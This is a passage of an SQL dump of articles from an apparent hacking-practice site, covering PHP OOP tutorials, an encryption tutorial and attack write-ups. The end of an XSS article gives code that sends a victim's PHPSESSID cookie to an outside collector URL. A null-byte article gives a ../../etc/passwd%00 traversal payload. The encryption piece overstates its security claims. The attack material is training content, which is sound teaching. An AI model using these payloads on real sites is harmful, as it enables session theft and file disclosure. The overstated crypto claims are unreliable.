/PHPSESSID=(\\w+)/.exec(cookieString);\nvar sessID = sessIDMatch[1];[/code]\n\nThis script is unnecessarily long however. Most fields (especially on a profile edit page) will have some kind of length-limit and you will usually have to optimize your script in order to not break this limit. So letâ€™s shorten it down a bit. Often times this can be done using either Googleâ€™s Closure Compiler, [url]http://closure-compiler.appspot.com[/url] (use the â€œsimpleâ€ setting) or the javascript packer, [url]http://dean.edwards.name/packer/[/url] (shrink variables but donâ€™t base 62 encode). In this case though it was better to do it manually, mostly because we are using regular expressions.\n\n[code]a=/D=(\\w+)/.exec(document.cookie)[1];[/code]\n\nNote how we are able to use only the big D from the PHPSESSID in our regular expression, as we know that no other cookie ends with a big D.\n\n[h1]Stealing the cookie[/h1]\nNow that have found a way to extract the session cookie, we need some way to steal it. For this step you will need to set up your own saving script on another server that can collect the sent cookie. Depending on how â€œsneakyâ€ you want to be there are a lot of different ways, the easiest being a straight forward redirect to your page, while a more hidden way would be using ajax to send the data in the background. For this example we will be using a third method, an image.\n\n[code]a=/D=(\\w+)/.exec(document.cookie)[1];$(''<img>'').attr(''src'',''http://example.com/xss.php?s=''+a})[/code]\n\nThere is nothing fancy going on here, we simply created an <img> tag and set its src attribute to the url of our cookie collector script. We then include the session id in the query string. In this example Iâ€™ve used jQuery, as it is available on HackThis!!, but itâ€™s also possible to create the img tag using, for example, the document.createElement approach. The jQuery method is considerably shorter however and, as already mentioned, shorter is in these circumstances often better.\n\n[h1]Conclusion[/h1]\nWith that our simple XSS attack is actually completed. If we had found a field that would expose our script to other member of the site and not only to ourself (as in my case) now all we would have had to do is sit back and wait for someone to stumble across our malicious page. In my case, though, there are a couple of additional steps required to make the exploit work. But that is for a later time.\n\nThanks for reading, and feel free to send me a PM or leave a comment if there is anything you are wondering about.', 11322, 0),
(1191, 'PHP:OOP Part 3 - Magic Methods', 'phpoop-magic-methods', 5, 1, FROM_UNIXTIME(1367194545), '[h1]Introduction[/h1]\r\nTo begin with, magic methods most basically said represent functions (or better know as methods) that are executing automatically under certain circumstances. The idea is that you define their usage in the code and they are also never directly called meaning that they run regardless of any restrictions. Also I''d like to mention it here that magic methods in PHP differ significantly from their usage in other object-oriented coding under other languages. There is an exact number of those magic methods and they are:\r\n\r\nAlso, note that magic methods can only be used inside classes.\r\n\r\nâ€¢ [color=#FFDAB9]__construct()[/color]\r\nâ€¢ [color=#FFFFFF]__destruct()[/color]\r\nâ€¢ [color=#FFDAB9]__call()[/color]\r\nâ€¢ [color=#FFFFFF]__callStatic()[/color]\r\nâ€¢ [color=#FFDAB9]__get()[/color]\r\nâ€¢ [color=#FFFFFF]__set()[/color]\r\nâ€¢ [color=#FFDAB9]__isset()[/color]\r\nâ€¢ [color=#FFFFFF]__unset()[/color]\r\nâ€¢ [color=#FFDAB9]__sleep()[/color]\r\nâ€¢ [color=#FFFFFF]__wakeup()[/color]\r\nâ€¢ [color=#FFDAB9]__toString()[/color]\r\nâ€¢ [color=#FFFFFF]__invoke()[/color]\r\nâ€¢ [color=#FFDAB9]__set_state()[/color]\r\nâ€¢ [color=#FFFFFF]__clone()[/color]\r\n\r\n[h2]How it works?[/h2]\r\nHowever, in this part of the series of my object-oriented programming tutorials, I''ll be going only through the main methods because frankly speaking (without any intended behavior) I don''t think most of the people here would actually use the ones that I won''t be explaining here. So let''s get started.\r\n\r\n[h1]__get()[/h1]\r\nAs I always use to begin my explanations with an example let''s take the following basic class and explain how __get() can be used within it. We have one property called data and is equal to the string ''Keeper''.\r\n\r\n[code]\r\n<?php\r\n\r\nclass Foo{\r\n     public $data=''Keeper'';\r\n\r\n}\r\n$a=new Foo();\r\necho $a->data;\r\n\r\n?>\r\n[/code]\r\n\r\nWe create a new instance of the class and call data. Obviously, the result will be ''Keeper''. But what if we make a call to a property that simply does not exist in our class.\r\n\r\n[code]\r\n<?php\r\n..\r\n\r\necho $a->data1;\r\n..\r\n\r\n?>\r\n[/code]\r\n\r\nWe don''t get an error but an empty result. By using __get(),  we can objectify on the non-existent property that is being called. Besides that, the __get() method does not output any notice or error if there isn''t such case. It is being executed only when the certain event occurs. And here is how our class would look like:\r\n\r\n[code]\r\n<?php\r\n\r\nclass Foo{\r\n     public $data=''Keeper'';\r\n\r\n     public function __get($name) {\r\n           echo ''Call to ''.$name.'' failed. No such property.'';\r\n     }\r\n}\r\n$a=new Foo();\r\necho $a->data1;\r\n\r\n?>\r\n[/code]\r\n\r\nThe method is executed automatically and the $name parameter holds the name of the property that is not existent and logically, we will get output the result:\r\n\r\n[code]\r\nCall to data1 failed. No such property.\r\n[/code]\r\n\r\n[h1]__set()[/h1]\r\nOkay. The __set() method is used when we try to append or write data to a non-existent property. So, for example, we try to add the value ''Infamous'' to the data property after the instance. Then we just rewrite the previously defined value. Everything is running as expected.\r\n\r\n[code]\r\n<?php\r\n\r\nclass Foo{\r\n     public $data=''Keeper'';\r\n\r\n     public function __get($name) {\r\n           echo ''Call to ''.$name.'' failed. No such property.'';\r\n     }\r\n}\r\n$a=new Foo();\r\necho $a->data1=''Infamous'';\r\n\r\n?>\r\n[/code]\r\n\r\nBut if we try to add a property that doesn''t exist in our class and append a value to it, this is where the usage of __set() method comes in handy. Normally, we won''t get any error if we haven''t used __set() (same as with __get()). Here comes the time for me to add something that is probably the most important thing in this tutorial. When trying to write a property that doesn''t exist and assign a value to it, it automatically gets included dynamically in our code in run-time. That is specific for PHP alone. As I said in the beginning, magic methods differ a lot in PHP than in some other programming languages. So up to our code:\r\n\r\n[code]\r\n<?php\r\n\r\nclass Foo{\r\n     public $data=''Keeper'';\r\n\r\n     public function __get($name) {\r\n           echo ''Call to ''.$name.'' failed. No such property.'';\r\n     }\r\n\r\n     public function __set($name, $value) {\r\n           echo ''Trying to set ''.$name.'' with value ''.$value;\r\n     }\r\n}\r\n$a=new Foo();\r\n$a->data1=''Antagonism'';\r\n\r\n?>\r\n[/code]\r\n\r\nThe method accepts two parameters: $name and $value. Name becomes the name of the property itself and $value becomes its value. Pretty self-explanatory, right? __set() actually prevents from including any non-existent properties in our code. So let''s see an actual usage from which we can benefit by using __set().\r\n\r\n[code]\r\n<?php\r\n\r\nclass Foo{\r\n     private $data=array();\r\n\r\n     public function __get($name) {\r\n           return $this->data[$name];\r\n     }\r\n\r\n     public function __set($name, $value) {\r\n           $this->data[$name]=$value;\r\n     }\r\n}\r\n$a=new Foo();\r\n$a->data1=''Antagonism'';\r\necho $a->data1;\r\n\r\n?>\r\n[/code]\r\n\r\nSo what we practically do store the property that is being included by a third-party and its value to an array. That very situation of the code is called registry as a whole because that array can be used to extract the data or append new one to it. In this case, this doesn''t break our code or cause conflicts between properties carrying the same name and so on.\r\n\r\n[h1]__call()[/h1]\r\n_call() itself has pretty much the same functionality and usage as __get() and __set() but with one exception/difference. It refers to methods rather than properties (as __get() and __set() did).\r\n\r\n[code]\r\n<?php\r\n\r\nclass Foo{\r\n     private $data=array();\r\n\r\n     public function __get($name) {\r\n           return $this->data[$name];\r\n     }\r\n\r\n     public function __set($name, $value) {\r\n           $this->data[$name]=$value;\r\n     }\r\n}\r\n$a=new Foo();\r\n$a->bar();\r\necho $a->data1;\r\n\r\n?>\r\n[/code]\r\n\r\nUpon execution of this code we get an error stating that we try to access an undefined method in an object context.\r\n\r\n[code]\r\nFatal error: Call to undefined method Foo::bar() in ..\r\n[/code]\r\n\r\nNow let''s write our magic method __call() that would take care of this issue.\r\n\r\n[code]\r\n<?php\r\n\r\nclass Foo{\r\n     private $data=array();\r\n\r\n     public function __get($name) {\r\n           return $this->data[$name];\r\n     }\r\n\r\n     public function __set($name, $value) {\r\n           $this->data[$name]=$value;\r\n     }\r\n\r\n     public function __call($name, $arguments) {\r\n           echo $name;\r\n     }\r\n}\r\n$a=new Foo();\r\n$a->bar();\r\necho $a->data1;\r\n\r\n?>\r\n[/code]\r\n\r\nThat would simply return the name of the method that we are referring to, which in our case is ''bar''. Since __call() accepts two parameters, the first one we already talked about it and the arguments one is in fact an array. To make it more clear to those who are confused, let''s dump the array, add a few parameters to the method bar and see what it has within itself.\r\n\r\n[code]\r\n     public function __call($name, $arguments) {\r\n           var_dump($arguments);\r\n     }\r\n[/code]\r\n\r\nAnd assign the parameters to the method:\r\n\r\n[code]\r\n$a->bar(1,2,3);\r\n[/code]\r\n\r\n[code]\r\narray(3) { [0]=> int(1) [1]=> int(2) [2]=> int(3) }\r\n[/code]\r\n\r\n[h1]__invoke()[/h1]\r\nWhat the __invoke() method does is allow a method in an object to be called as a function. We''ll make the casual example to explain the stuff based on it.\r\n\r\n[code]\r\n<?php\r\n\r\nclass Invoke{\r\n\r\n     public function foo($name){\r\n          echo $name;\r\n     }\r\n\r\n     public function __invoke($name){\r\n          echo $name;\r\n     }\r\n\r\n}\r\n\r\n$object = new Invoke();\r\n$object->foo(''Keeper'');\r\n\r\n?>\r\n[/code]\r\n\r\nCreating the instance for the method and visualizing it returns the more than predictable result ''Keeper''. Same goes if we use the magic method directly without calling the class.\r\n\r\n[code]\r\n<?php\r\n..\r\n$object->__invoke(''Keeper'');\r\n\r\n..\r\n?> \r\n[/code]\r\n\r\nThough the second way of outputting a result from the __invoke() method is not practical at all, I just wanted to introduce you to the concept of using it and that it is valid to execute the code like so. We can also achieve this with much less code like for example adding the following line:\r\n\r\n[code]\r\n$object(''Antagonism'');\r\n[/code]\r\n\r\nThis is the actual usage of that method. As you see from the last code snippet we use the object as a function.\r\n\r\n\r\n[h1]Conclusion[/h1]\r\nAs I mentioned before this is the third part of the series I''m conducting. The material is much less in amount than the previous ones and probably the future ones that I''m going to post really soon. Magic methods themselves are pretty self-explanatory, there is nothing hard even if one just follows the documentation for their usage in a certain programming language. [i]Thanks for reading![/i]', 793, 0);
INSERT INTO `articles` (`article_id`, `title`, `slug`, `category_id`, `user_id`, `submitted`, `body`, `views`, `featured`) VALUES
(1078, 'Common PHP attacks: Poison Null Byte', 'common-php-attacks-poison-null-byte', 10, 1, FROM_UNIXTIME(1349703090), '[h1]What is a null byte[/h1]\r\nThe Poison Null Byte aka The Poisoned NUL Byte was originally dubbed as such by Olaf Kirch in a [url=http://groups.google.com/group/fa.linux.security/browse_thread/thread/998970a5c98a1dc1/dfcf533ece792009%23dfcf533ece792009]post[/url] in the [url=http://groups.google.com/group/fa.linux.security/topics]fa.linux.security[/url] news group. A null byte in many languages is used to detect the end of a string. As opposed to storing an integer value in the first byte or two of the string stating the total length. A null byte on the other hand would just be placed at the end of the string. By embedding NULL Bytes/characters into applications that do not handle postfix NULL terminators properly, an attacker can exploit a system using techniques such as [url=http://www.hackthis.co.uk/articles/common-php-attacks-directory-traversal]directory traversal[/url].\r\n\r\nThe Poison Null Byte exploit takes advantage strings with a known length that can contain null bytes, and whether or not the API being attacked uses null terminated strings. By placing a NULL byte in the string at a certain byte, the string will terminate at that point, nulling the rest of the string, such as a file extension.\r\n\r\nThere are a number of ways to use the Poison Null Byte exploit, including the following:\r\n[list]\r\n[*] The termination of a filename within a string, for example, a file extension.\r\n[*] Terminating or commenting an SQL statement when dynamically executing, such as Oracle''s ''EXECUTE IMMEDIATE''.\r\n[/list]\r\n\r\n[h1]Example[/h1]\r\n[code]$file = $_GET[''file''];\r\nrequire_once("/var/www/$file.php");[/code]\r\nWhile the above script appears to be secured by forcing the ".php" file extension, it could be exploited as follows: http://www.example.com/index.php?file=../../etc/passwd%00. This NULL byte injection would result in the mandatory appended file extension (.php) to be dropped, and the /etc/passwd file to be loaded.\r\n\r\n[h1]Solution[/h1]\r\nThere are a number of ways to prevent Poison Null Byte injections within PHP. These include escaping the NULL byte with a backslash, however, the most recommended way to do so is to completely remove the byte by using code similar to the following:\r\n[code]$file = str_replace(chr(0), '''', $string);[/code]\r\n\r\n[h1]Source[/h1]\r\n[url=http://hakipedia.com/index.php/Poison_Null_Byte]http://hakipedia.com/index.php/Poison_Null_Byte[/url]', 9788, 0),
(1186, 'PHP:OOP Part 6 - Object Types Validation & Documenting', 'phpoop-object-types-validation-documenting', 5, 1, FROM_UNIXTIME(1367195061), 'In this tutorial, we''ll gonna introduce some "tools" that would allow us to check an object''s parents, its class, what it has inherited and what interfaces are implemented upon it. I won''t go through all of the functions because they are a lot and besides, the majority of them are really self-explanatory and the documentation about them is good enough even for beginners.\r\n\r\nI''ll be using the following files in this tutorial (stating it here to avoid confusion): [color=#87CEFA]index.php[/color], [color=#87CEFA]SuperMan.php[/color], [color=#87CEFA]Human.php[/color].\r\n\r\n[h1]Object Types Validation[/h1]\r\nLet''s include the [color=#98FB98]SuperMan.php[/color] file in our [color=#98FB98]index.php[/color]\r\n\r\n[code]\r\n<?php\r\n\r\ninclude ''SuperMan.php'';\r\n[/code]\r\n\r\nIn the [color=#FFDAB9]SuperMan.php[/color] file I have included [color=#FFDAB9]Human.php[/color] and made a class with a few methods for data supply. Here is the code so that you may gain better understanding and of course to be able to carry on with the tutorial.\r\n\r\n[code]\r\n<?php\r\n\r\ninclude ''Human.php'';\r\n\r\nclass SuperMan extends Human{\r\n\r\n    public function __construct() {\r\n         parent::__construct();\r\n         echo ''Superman construction<br />'';\r\n    }\r\n\r\n    public function goToEat(){\r\n         echo ''I refuse'';\r\n    }\r\n\r\n    public function showFace(){\r\n         echo ''Show<br />'';\r\n    }\r\n\r\n    public function drive(){\r\n         $this->driveCar();\r\n    }\r\n\r\n}\r\n\r\n?>\r\n[/code]\r\n\r\nSo [color=#E0FFFF]index.php[/color] inherits SuperMan and SuperMan by itself inherits Human.php. [color=#E0FFFF]Human.php[/color] has an included [color=#E0FFFF]Animal.php[/color] class and so on. The idea is just to have multiple inherits of classes and objects so that we may show how it works. Now here is the class Human (it has nothing specific within it - just a few more methods).\r\n\r\n[code]\r\n<?php\r\n\r\ninclude ''Animal.php'';\r\nclass Human extends Animal {\r\n\r\n     public function playWow(){\r\n          echo ''Wow<br />'';\r\n     }\r\n\r\n     protected function driveCar(){\r\n          echo ''Car<br />'';\r\n     }\r\n}\r\n\r\n?>\r\n[/code]\r\n\r\nNow let''s make a new instance of SuperMan in our index.php and we want to check whether that object that is appended to the variable $human is an instance of the class SuperMan. So let''s do this with the well-known function [b]var_dump()[/b] and use the keyword [color=#FFA500]instanceof[/color]. First we define the variable that is handling the instance then we use the keyword [color=#FFA500]instanceof[/color] and the name of the class.\r\n\r\n[code]\r\n<?php\r\n\r\ninclude ''SuperMan.php'';\r\n\r\n$human = new SuperMan();\r\n\r\nvar_dump(($human instanceof SuperMan));\r\n?>\r\n[/code]\r\n\r\nWithin the second pair of brackets, we''ll receive the output in boolean type. Since the object $human is an instance of SuperMan so therefore we get returned:\r\n\r\n[code]\r\nbool(true)\r\n[/code]\r\n\r\nWhat if we want to check whether the object is from class Animal.\r\n\r\n[code]\r\n<?php\r\n..\r\nvar_dump(($human instanceof Animal));\r\n..\r\n?>\r\n[/code]\r\n\r\nWe will get the same result because Animal is the main class. Basically, speaking SuperMan inherits Human, Human inherits Animal. So SuperMan is part of the class Animal, so instance of will return us a boolean true for any of the classes we currently dispose with because that is the so-called tree structure. This is the way we can validate whether an outside object corresponds to the requirements we have defined. Later on you''ll see that in object-oriented programming a lot of objects are being gathered in a file and let''s say we have an incoming object and we would then want to validate whether the object is from the correct type and whether it implements the appropriate interfaces.\r\n\r\nLet''s run the following:\r\n\r\n[code]\r\n<?php\r\n\r\ninclude ''SuperMan.php'';\r\n\r\n$human = new SuperMan();\r\n$human2 = new Animal();\r\n\r\nvar_dump(($human instanceof $human2));\r\n\r\n?>\r\n[/code]\r\n\r\nThe examples I''ve given above are just comparing and checking class names but we can also use variables like in this example to validate the object and instance. So practically whether one object is an instance of another.\r\n\r\nNow there are several other functions that are used in more specific cases. Some of them are:\r\n\r\n\r\n[color=#FFDAB9]class_alias();[/color]\r\n- Generates an alias of a desired class\r\n[color=#FFDAB9]class_exists();[/color]\r\n- Checks whether the class has been defined\r\n[color=#FFDAB9]get_class();[/color]\r\n- Outputs the name of a class that is part of an object\r\n[color=#FFDAB9]is_a();[/color]\r\n- Checks whether an object is of a class and does not include interface implementations like instanceof\r\n[color=#FFDAB9]method_exists();[/color]\r\n- Checks whether a class method is available\r\n[color=#FFDAB9]property_exists();[/color]\r\n- Checks whether an object or a class has a defined property\r\n[color=#FFDAB9]trait_exists();[/color]\r\n- Checks whether a trait is existent\r\n\r\n[h1]Documenting of Methods & Properties[/h1]\r\nBasically, documenting is just writing comments but in a more specific way. Most people would ignore that totally, but when it comes to massive projects, all those tiny little things I use to talk about in my tutorials and anywhere at all will come in handy for sure. As well as that, documentation is useful for other programmers that would interfere in our code or just for our own ease.\r\n\r\n[code]\r\n<?php\r\n\r\n/*\r\n * To change this template, choose Tools | Templates\r\n * and open the template in the editor.\r\n */\r\n\r\n/**\r\n * Description of Doc\r\n *\r\n * @author Keeper\r\n */\r\n\r\n?>\r\n[/code]\r\n\r\nThis template is generated by an IDE (Netbeans). Those types of comments are specific for object-oriented programming and luckily they are almost the same in all programming languages. It''s accepted that when we have a class, the first few lines should be describing it most briefly, from which object it is, whether it is part of an administration module and so on. We don''t need to be too describing, we just need to handle the idea of what the project is about. Whether it would be a GPL, Apache or open source license and so on.\r\n\r\nNow when we have this:\r\n\r\n[code]\r\n<?php\r\n\r\n/**\r\n\r\n*/\r\n\r\n?>\r\n[/code]\r\n\r\nHere in free-text we describe what the class is going to do (convert text to PDF, word unscrambler, modules etc.) and there are also some specific tags like "@" the at symbol which have some keywords embedded about themselves. For example:\r\n\r\n[code]\r\n<?php\r\n\r\n/**\r\n * @author Keeper\r\n */\r\n\r\n?>\r\n[/code]\r\n\r\nIn Netbeans there is a whole documentation about them in the environment itself. They are all more than self-explanatory and their usage is totally unnecessary but in order to keep things ''tidy'' and help ourselves when we are releasing the code as a product, we''d require those comments and documentations at the beginning of our file, whether it would be our license, copyright, disclaimer, about section or whatever.\r\n\r\n[img]http://i.imgur.com/lvlc2MH.png[/img]\r\n\r\nAlso, as you might guess, those comment lines (no matter that they are count as ''special'' - documentation) do not alter the way our code is being processed and then executed. They are after all just simple comments. But bear in mind that in Java annotations, things are different. They alter the way of work and are also written differently.\r\n\r\nNow let''s make a simple and pretty much the most basic method we could think of just to see it in practical use:\r\n\r\n[code]\r\n<?php\r\n\r\npublic function test($a,$b){\r\n     return true;\r\n}\r\n\r\n?>\r\n[/code]\r\n\r\nThis is a senseless method which has no return value or any logical output. The idea is just to see how the comments are being generated. Now Netbeans automatically generates the documentation for the method upon typing /** and hitting enter.\r\n\r\n[code]\r\n/**\r\n * This is a test dummy method\r\n * @param type $a\r\n * @param type $b\r\n * @return type\r\n */\r\n[/code]\r\n\r\nIn the first line we can write our description and then we have those predefined tags with the parameters we have for you method and the return type. Let''s modify them a bit and see what we''ll get later on. Suppose, I want to change the param tags into a more informative ones.\r\n\r\n[code]\r\n/**\r\n * This is a test dummy method\r\n * @param string $a name of the user\r\n * @param int $b age of the user\r\n * @return bool\r\n */\r\n[/code]\r\n\r\nMost environments use this documentation in run-time. Now let''s include this documentation of the class in our [color=#87CEFA]index.php[/color] and beforehand add another method to our class just so that we may view the auto-completion process.\r\n\r\n[code]\r\n<?php\r\n\r\ninclude ''Doc'';\r\n\r\n$d = new Doc();\r\n$d -> test();\r\n\r\n?>\r\n[/code]\r\n\r\nWe''ll get the documentation we had written some time ago for the method that we are referring to. The reason why I made a second method with no return value is that we could use it as an auto-completion example but we are good without it as well. So here''s what our documentation is being represented like in Netbeans.\r\n\r\n[img]http://i.imgur.com/q5hVXeC.png[/img]\r\n\r\nNow let''s document a single property. There is again, literally, no difference. Though it is rarely used to document properties especially, I just want to put an example to make it clear that there is practically no difference and nothing confusing.\r\n\r\n[code]\r\n<?php\r\n\r\n/**\r\n *\r\n * @var String\r\n */\r\npublic $name = ''Keeper'';\r\n\r\n?>\r\n[/code]\r\n\r\n[h1]Conclusion[/h1]\r\nThis is by far the easiest tutorial over my object-oriented series for PHP. Sixth part of the series, been a while since I posted the last one but I lacked the time to continue my series. Practically, you could simply grasp the logic from a cast of a glance but I needed to show you all the things there are about it. As I said before those ''techniques'' are used for detailed and in-depth projects where there are a lot of people working on the same code and they need to document most of the things. [i]Thanks for reading![/i]', 822, 0),
(1187, ' Hybrid Multiple Layer Encryption', 'hybrid-multiple-layer-encryption', 11, 1, FROM_UNIXTIME(1367193113), 'Something rather rare on the interwebs nowadays. This tutorial is addressed to delve into the very foundation of hybrid data concealment and neuron model compressions. I have gone as much in-depth as my knowledge allows. Following the examples in this thread, will enable you to conceal your data 99,9%+ securely. I want to state right here that similar technology (if not the same) is being used to parse data within certain governmental societies as funny as it may seem. I''ll go through the following topics until I finally reach the goal of concealing data as secure as possible. I''ll elaborate from the creation of the custom encryption algorithm to the moment I concatenate everything together and form a unique combination of methods that will hold any data safely. After all, in the end, every system relays on securing the data.\r\n\r\n\r\n[color=#32CD32][*][/color] [color=#E0FFFF]Introduction[/color]\r\n[color=#CCCCCC]- To get you known what all this is about[/color]\r\n[color=#32CD32][*][/color] [color=#FFDAB9]Hybrid Concealment & Multiple Layer Encryption[/color]\r\n[color=#CCCCCC]- What the term stands for and its concept[/color]\r\n[color=#32CD32][*][/color] [color=#E0FFFF]Creating of a Custom Encryption Algorithm[/color]\r\n[color=#CCCCCC]- Going through the process of writing our own encryption algorithm in PHP[/color]\r\n[color=#32CD32][*][/color] [color=#E0FFFF]Steganographying the Data[/color]\r\n[color=#CCCCCC]- The second phrase of the multiple layer encryption process[/color]\r\n[color=#32CD32][*][/color] [color=#FFDAB9]Neuron Model[/color]\r\n[color=#CCCCCC]- Some things do need to be explained[/color]\r\n[color=#32CD32][*][/color] [color=#E0FFFF]Analysis of the Security[/color]\r\n[color=#CCCCCC]- Overall assessment of the so far conducted methods[/color]\r\n[color=#32CD32][*][/color] [color=#FFDAB9]Conclusion[/color]\r\n[color=#CCCCCC]- To sum up what we''ve talked about[/color]\r\n\r\n\r\nAnother thing I should mention before the beginning of the tutorial is that everything I''m going to talk about here has been verified and I haven''t omitted any mistakes so please do not try to correct my statements as I''m 100% sure they are valid. Besides, I won''t be able to edit the thread after I post it due to its immense length. \r\n\r\n[h1]Hybrid Concealment & Multiple Layer Encryption[/h1]\r\nHybrid as of its name, indicates the mixture of multiple methods that are being used to conceal the data. We''re going to look into those of visual cryptography and steganography. Combining both, will give us a hybrid result. While cryptography has the issue of revealing data encryption or encoding, steganography has the notion of hiding the message but not the idea of manipulating it through cryptography engineering. So when we concatenate both methods, we reach the moment where their drawbacks are now extinct. By multiple layer encryption we mean the process of having multiple layers or rather steps that are being secured individually.\r\n\r\n[img]http://i.imgur.com/73ZFyGg.png[/img]\r\n\r\nThis is what our purpose would be. In order to achieve/complete this scheme, we need to take several things under account and look into every single layer from the three of those. One of them being the first layer. It is by far the most important thing in the whole tutorial. Unless we manage to manipulate it, there would be practically no point in any of the further layer encryptions.\r\n\r\nWhat we need to do with it is use an encryption that is considered to be uncrackable but not impossible to decrypt. So the first layer of our process is going to be encrypted in the Vernam cipher, also known as One-time Pad encryption algorithm. I will explain what the cipher is about and how it is being processed because I don''t want you to just skim through this and just apply the algorithm without knowing its functionality. The Vernam cipher encrypts each and every one of its bits of data/information into modular arithmetic. Now in order to gain basic understanding over the so-called modular arithmetics in mathematics, let''s take the following scheme below.\r\n\r\n[img]http://i.imgur.com/nFilvbW.png[/img]\r\n\r\nThe original example of modular arithmetics is represented with the clock mechanism because it is the easiest to understand. Imagine it''s 11 PM right now. After 15 hours, for instance, it would be 2 o''clock PM on the next day. We don''t have the basic addition of two numbers. It won''t be like 11+15 = 26 simply because there is no such time period in the clock. So the time period starts again from the beginning after it reached the 12-hour module. Same thing happens with the Vernam cipher. It encrypts every bit of data with the clock arithmetic module. The Vernam encryption is supposed to be impossible to crack only when the following are being fulfilled:\r\n\r\n[list]\r\n[color=#32CD32][*][/color] [color=#CCCCCC]Encryption key must be 100% random[/color]\r\n[color=#32CD32][*][/color] [color=#CCCCCC]Never used twice or more in the same encryption process[/color]\r\n[color=#32CD32][*][/color] [color=#CCCCCC]Larger than the plaintext value[/color]\r\n[/list]\r\n\r\nNow let''s have a look at how the data is being processed in within the One-time Pad cipher. For the sake of this tutorial, I''m going to use PHP as the language which is going to represent the encryption process. This version of the Vernam code is not mine but it was the only one I managed to find on the web. I''ll explain what each line of it does so that you may gain better understanding of how the code is processed. First off with the encryption part and then the decryption.\r\n\r\n[img]http://i.imgur.com/IyZf097.png[/img]\r\n\r\nI chose the Vernam encryption because it is the only one that is proved to be theoretically impossible to crack. However, if you neglect any of the above points can lead to the cipher being cracked. As well as that, the first layer is the most important because it protects from reaching the other two ones. If the first one get breached, the attacker can perform cryptanalysis like chosen plaintext attack or known plaintext attack since he has some information from breaking the first layer. Mitigating such attack against the OTP algorithm and using it properly can be achieved following Schneier''s method of data sanitization.\r\n\r\nSome people confuse this a lot implementing it the following way:\r\n\r\n[code]\r\nPass 1: Writes a one\r\nPass 2: Writes a zero\r\nPass 3: Writes a random character\r\nPass 4: Writes a random character\r\nPass 5: Writes a random character\r\nPass 6: Writes a random character\r\nPass 7: Writes a random character\r\n[/code]\r\n\r\nI don''t know where this came from, but it has absolutely nothing to do with Schneier''s method.\r\n\r\nIt involves the generation of two cipher texts which are then combined to form the final one. First is the generation of the pad which must be 100% random and greater than the plaintext value otherwise everything afterwards would be futile and pointless. Then use exclusive disjunction to mark the plaintext with the random pad you''ve made. Now we need to encrypt the output we just got and the initial pad with a different algorithm than Vernam. And finally, we concatenate both outputs.\r\n\r\n[img]http://i.imgur.com/6VJsaNs.png[/img]\r\n\r\nFor those that are eager to learn more about the One-time Pad encryption cipher, here is the full PHP source that I used to exemplify the above codes. It is old (2003) and some of the functions that were used within it were deprecated as of PHP 5.0+. However, I modified it a bit and excluded some vulnerabilities that it was consisting of. For example the PHP_SELF, in the action attribute of the HTML form. \r\n\r\n[code]\r\n<?php\r\n/*\r\nCopyright (C) 2003 Enders Web Development\r\n\r\nThis program is free software; you can redistribute it and/or modify it under \r\nthe terms of the GNU General Public License as published by the Free Software \r\nFoundation; either version 2 of the License, or (at your option) any later \r\nversion.\r\n\r\nThis program is distributed in the hope that it will be useful, but WITHOUT ANY \r\nWARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A \r\nPARTICULAR PURPOSE. See the GNU General Public License for more details.\r\n\r\nYou should have received a copy of the GNU General Public License along with \r\nthis program; if not, write to the \r\nFree Software Foundation, Inc., \r\n59 Temple Place - Suite 330, \r\nBoston, MA 02111-1307, USA.\r\n\r\nAuthor Email: tomender@ptd.net\r\nAuthor Post:\r\nJ. Thomas Enders\r\nPO Box 663\r\nGilbert, PA 18331, USA\r\n*/\r\n\r\n  error_reporting(E_ALL);\r\n\r\n  if(!isset($_POST[''key''])) {$_POST[''key''] = '''';}\r\n  if(!isset($_POST[''plaintext''])) {$_POST[''plaintext''] = '''';}\r\n  if(!isset($_POST[''ciphertext''])) {$_POST[''ciphertext''] = '''';}\r\n\r\n  $parse = false;\r\n  $error = '''';\r\n  if(isset($_POST[''encrypt'']) || isset($_POST[''decrypt''])) {\r\n      $parse = true;\r\n      if((isset($_POST[''encrypt'']) || isset($_POST[''decrypt'']))) {\r\n          if($_POST[''key''] == '''') {\r\n              $error .= "ERROR: You must enter a key to encrypt or decrypt text.<br />\\n";\r\n              $parse = false;\r\n          } elseif(!preg_match("^[a-z]+$/i^",$_POST[''key''])) {\r\n              $error .= "ERROR: The key (" . $_POST[''key''] . ") can only contain letters.<br />\\n";\r\n              $parse = false;\r\n          }\r\n      }\r\n    \r\n      if(isset($_POST[''encrypt'']) && $_POST[''plaintext''] == '''') {\r\n          $error .= "ERROR: You must enter pleantext to encrypt.<br />\\n";\r\n          $parse = false;\r\n      } elseif (isset($_POST[''decrypt'']) && $_POST[''ciphertext''] == '''') {\r\n          $error .= "ERROR: You must enter ciphertext to decrypt.<br />\\n";\r\n          $parse = false;\r\n      }\r\n  }\r\n  \r\n  if ($parse && isset($_POST[''encrypt''])) {\r\n      $_POST[''ciphertext''] = encrypt($_POST[''key''],$_POST[''plaintext'']);\r\n  } elseif ($parse && isset($_POST[''decrypt''])) {\r\n      $_POST[''plaintext''] = decrypt($_POST[''key''],$_POST[''ciphertext'']);\r\n  } \r\n\r\n  echo ''<?xml version="1.0" encoding="UTF-8"?>'' . "\\n";\r\n?>\r\n<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"\r\n "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">\r\n\r\n<html xmlns="http://www.w3.org/1999/xhtml">\r\n<head>\r\n<title>Vernam Cipher</title>\r\n<style type="text/css">\r\n    body {\r\n        font-family: arial,helvetica,_sans;\r\n        font-size: 11pt;\r\n        color: #000000;\r\n        background-color: #FFFFEE;\r\n    }\r\n    \r\n    div.dataScrubbing {\r\n        position: absolute;\r\n        padding: 5px;\r\n        background-color: #EEFFFF;\r\n        border-width: 1px;\r\n        border-color: #888899;\r\n        border-style: solid;\r\n        color: #990000;\r\n        width: 375px;\r\n    }\r\n    \r\n    div.inputArea {\r\n        background-color: #FFFFFF;\r\n        position: absolute;\r\n        padding: 5px;\r\n        border-width: 1px;\r\n        border-color: #000000;\r\n        border-style: solid;\r\n        width: 380px;\r\n    }\r\n    \r\n    input,textarea {\r\n        font-family: arial,helvetica,_sans;\r\n        font-size: 11pt;\r\n        color: #000000;\r\n        background-color: #EEFFFF;\r\n        border-width: 1px;\r\n        border-color: #889999;\r\n        border-style: solid;\r\n    }\r\n</style>\r\n</head>\r\n<body>\r\n<h1>Vernam Cipher</h1>\r\n\r\n<?php\r\n    if($error != '''') {\r\n        echo ''<div class="dataScrubbing">'' . "\\n";\r\n        echo $error;\r\n        echo "</div>\\n";\r\n        echo "<div><br /><br 